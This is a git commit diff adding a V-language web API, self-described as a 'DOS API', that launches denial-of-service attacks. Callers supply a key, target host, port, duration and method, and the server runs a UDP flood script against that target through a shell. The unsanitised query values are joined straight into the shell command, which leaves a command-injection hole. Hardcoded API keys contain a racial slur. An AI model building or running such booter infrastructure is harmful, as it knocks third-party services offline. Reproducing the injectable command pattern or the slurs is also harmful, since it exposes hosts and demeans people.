ea8195b19dfa051761a2644e8ad71ca6a6dd8335
Erupt <101347500+Eruptsy@users.noreply.github.com>
2022-04-20 08:28:32 -0400

    DONE

--- api.v
+++ api.v
@@ -1,12 +1,31 @@
+/*
+	DOS API Script to host locally
+
+@title: dos api
+@since: 4/20/22
+@author: Erupt
+@github: https://github.com/Eruptsy
+
+This file can be used by itself. The whole API is coded in here as of right now but will be advanced later
+*/
+
 import os
 import vweb
 
 pub struct App {
 	vweb.Context
+	pub mut:
+		api_keys		[]string 			= ['my_nigger_key', // MAIN KEY YOU CAN DO ADMIN SHIT WITH
+												'niggered'
+												]
+									
+		methods 		map[string]string 	= { 'UDP': 'screen -dm python h.py ',
+												'TCP': 'bullshit'
+												}
 }
 
 fn main() {
-	vweb.run(&App{}, 81)
+	vweb.run(&App{}, 80)
 }
 
 pub fn (mut app App) index() vweb.Result {
@@ -14,17 +33,28 @@ pub fn (mut app App) index() vweb.Result {
 }
 
 pub fn (mut app App) api() vweb.Result {
-	host 		= app.query['host']
-	port 		= app.query['port']
-	time 		= app.query['time']
-	method 		= app.query['method']
+	key			:= app.query['key']
+	host 		:= app.query['host']
+	port 		:= app.query['port']
+	time 		:= app.query['time']
+	method 		:= app.query['method']
+
+	if key in app.api_keys {} else { 
+		app.text("[x] Error, Invalid key!")
+		return $vweb.html()
+	}
 
 	if host == "" || port == "" || time == "" || method == "" {
 		app.text("[x] Error, Fill all GET parameters to continue!")
+		return $vweb.html()
 	}
 
-	// Sanitized and Validate all inputs
-
+	println(app.methods[method] or {
+		app.text("[x] Error, Invalid method!")
+		return $vweb.html()
+	})
+	full_cmd := app.methods[method] + "${host} ${port} ${time}"
+	os.execute(full_cmd)
 		
 
 	return $vweb.html()
--- core/configuration.v
+++
@@ -1,7 +0,0 @@
-module core
-
-import os
-
-pub fn get_all_methods() map[string]string {
-	mut methods = os.ls(os.getwd() + "/assets/methods/") or { [''] }
-}
